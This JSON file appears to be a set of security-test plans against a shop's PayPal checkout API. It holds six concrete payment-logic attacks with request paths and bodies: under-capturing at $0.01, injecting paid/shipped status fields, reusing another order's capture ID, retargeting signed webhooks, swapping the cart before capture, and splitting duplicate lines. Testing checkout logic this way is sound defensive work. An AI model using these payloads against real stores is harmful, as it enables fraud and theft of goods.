{
  "plans": [
    {
      "name": "Partial capture at capture time",
      "idea": "The create order is correctly priced at $64, but the capture endpoint may forward a client-supplied capture amount to PayPal or trust it when marking the order paid.",
      "expect": "Only $0.01 is captured, yet the approved kettle order is marked shipped.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal/{{b.paypalOrderId}}/capture",
          "body": {
            "amount": {
              "currency_code": "USD",
              "value": "0.01"
            },
            "final_capture": true
          },
          "times": 1,
          "together": false,
          "save": "c"
        }
      ]
    },
    {
      "name": "Paid-state injection at creation",
      "idea": "Order creation may copy client-supplied status fields into the new order record instead of allowing only the server to set paid or shipped state.",
      "expect": "An order is created or approved but never captured, while the shop already treats it as paid or shipped.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal",
          "body": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 1
              }
            ],
            "paid": true,
            "isPaid": true,
            "captured": true,
            "state": "shipped",
            "status": "COMPLETED",
            "paymentStatus": "COMPLETED"
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "buy",
          "tamper": {
            "paid": true,
            "isPaid": true,
            "captured": true,
            "state": "shipped",
            "status": "COMPLETED",
            "paymentStatus": "COMPLETED"
          },
          "blockCapture": true,
          "save": "b"
        }
      ]
    },
    {
      "name": "Transplant legit capture via capture API",
      "idea": "The capture endpoint may trust a capture ID, PayPal order ID, status, or shop reference supplied in its request body rather than binding the verified capture to the order identified in the path.",
      "expect": "A fresh unpaid shop order is shipped by reusing the legitimately completed $64 capture, without paying for the new order.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal",
          "body": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 1
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal/{{a.body.paypalOrderId}}/capture",
          "body": {
            "captureId": "{{legit.captureId}}",
            "paypalCaptureId": "{{legit.captureId}}",
            "transactionId": "{{legit.captureId}}",
            "paypalOrderId": "{{legit.paypalOrderId}}",
            "status": "COMPLETED",
            "state": "shipped",
            "amount": "64.00"
          },
          "times": 1,
          "together": false,
          "save": "c"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal/{{legit.paypalOrderId}}/capture",
          "body": {
            "ref": "{{a.body.ref}}",
            "shopOrderId": "{{a.body.ref}}",
            "shopOrderRef": "{{a.body.ref}}",
            "paypalOrderId": "{{a.body.paypalOrderId}}"
          },
          "times": 1,
          "together": false,
          "save": "d"
        }
      ]
    },
    {
      "name": "Retargeted approved-then-completed webhooks",
      "idea": "The webhook handler may locate the order solely from editable custom_id, reference_id, invoice_id, or related order fields, without binding the real capture to the PayPal order that actually produced it.",
      "expect": "A fresh unpaid order passes through approved and completed states and is shipped using the legit capture identity.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal",
          "body": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 1
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "webhook",
          "event": "CHECKOUT.ORDER.APPROVED",
          "edit": {
            "resource.purchase_units.0.reference_id": "{{a.body.ref}}",
            "resource.purchase_units.0.custom_id": "{{a.body.ref}}",
            "resource.purchase_units.0.invoice_id": "{{a.body.ref}}-0bbd"
          },
          "signed": true,
          "times": 1
        },
        {
          "do": "webhook",
          "event": "PAYMENT.CAPTURE.COMPLETED",
          "edit": {
            "resource.custom_id": "{{a.body.ref}}",
            "resource.invoice_id": "{{a.body.ref}}-0bbd",
            "resource.supplementary_data.related_ids.order_id": "{{a.body.paypalOrderId}}"
          },
          "signed": true,
          "times": 1
        }
      ]
    },
    {
      "name": "Swap cart after approval, before capture",
      "idea": "Capture may fulfill the session's latest shop order instead of the items belonging to the PayPal order actually approved and captured.",
      "expect": "Pay $64 for one approved kettle, but the later ten-kettle order is shipped, or both orders are shipped.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 1
              }
            ]
          },
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal",
          "body": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 10
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal/{{b.paypalOrderId}}/capture",
          "body": {},
          "times": 1,
          "together": false,
          "save": "c"
        }
      ]
    },
    {
      "name": "Split duplicate lines",
      "idea": "Pricing may deduplicate repeated SKUs with a map while fulfillment may sum every raw line, creating a disagreement between the amount charged and the quantity shipped.",
      "expect": "PayPal charges for one kettle, but three kettles are fulfilled.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 1
              },
              {
                "product": "KC-KETTLE",
                "count": 1
              },
              {
                "product": "KC-KETTLE",
                "count": 1
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    }
  ]
}